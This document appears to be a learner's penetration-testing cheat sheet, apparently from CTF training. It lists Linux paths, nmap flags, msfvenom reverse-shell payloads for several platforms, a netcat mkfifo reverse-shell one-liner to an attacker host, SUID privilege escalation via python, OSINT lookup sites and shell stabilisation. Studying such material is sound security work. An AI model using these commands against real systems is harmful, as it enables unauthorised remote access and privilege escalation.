-<span style="color:rgb(0, 176, 80)">Common directories</span>:
 <span style="color:rgb(0, 176, 240)">/etc</span>: stores files used by the operating system
- `/etc/hosts` to add hosts
- `/etc/passwd` to enumerate users,
- `/etc/shadow` to store password hash ($ prefix $ options $ salt $ hash)
 <span style="color:rgb(0, 176, 240)">/var</span>: stores data that is frequently accessed by services or applications like logs(var/log/ ....)
 <span style="color:rgb(0, 176, 240)">/root</span>: home directory for the "root"
 <span style="color:rgb(0, 176, 240)">/tmp</span>: temporary, files in tmp are deleted after restart

-<span style="color:rgb(0, 176, 80)">Adding & after command returns the process ID (as it is running in the background), then we can use the (fg) command to bring it back to focus and start running in the foreground</span>

-lusrmgr.msc in **windows** Win+R: view users and groups, other helpful places are (advanced system settings) and (msconfig)

**nmap -T4 -n -sC -sV -Pn -p-**

-<span style="color:rgb(231, 116, 8)">When uploading a reverse shell or XSS injection, use my IP address not the victim's IP, and make sure to do nc -lnvp 5000 (assuming the port is 5000)</span>


![[Pasted image 20260227002528.png]]

<span style="color:rgb(255, 0, 0)">Common msfvenom command for reverse php shell</span>: msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php
     then go msfconsole and (use exploit/multi/handler) to recieve connection and set the same payload, LHOST and LPORT using set command, do ./shell.php to execute. Or upload the reverse shell myself using nc -lnvp if its a non-staged reverse shell (eg: reverse_shell not reverse/shell )
 - Other payloads:
     <span style="color:rgb(255, 0, 0)">Windows</span>: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
     
     <span style="color:rgb(255, 0, 0)">PHP</span>: msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
     
     <span style="color:rgb(255, 0, 0)">ASP</span>: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
     
     <span style="color:rgb(255, 0, 0)">Python</span>: msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
     
     <span style="color:rgb(255, 0, 0)">Linux (elf)</span>: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

<span style="color:rgb(255, 0, 0)">convert a shell to meterpreter</span>: 
    use post/multi/manage/shell_to_meterpreter 
    set SESSION 1 
    run


`Reverse shell: attacker listens, target connects
`Bind shell: target listens, attacker connects`
-(More shells in "Shells overview" premium room)
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

<span style="color:rgb(255, 255, 0)">GTFOBins</span>: sudo -l to check for possible bins, used to bypass local security and escalate privileges, we found a file with SUID permission using the command `find / -type f -user root -perm -u=s 2>/dev/null` and it was /usr/bin/python, so we executed `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` from the GTFOBins website to escalate privileges

https://osintframework.com/
https://www.idcrawl.com/: for OSINT to find accounts
https://epieos.com/: email/phone data
https://gravatar.com/site/check: email info

for timeline explorer
```
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

**STABALIZE A REVERSE SHELL**: `python3 -c 'import pty; pty.spawn("/bin/bash")'`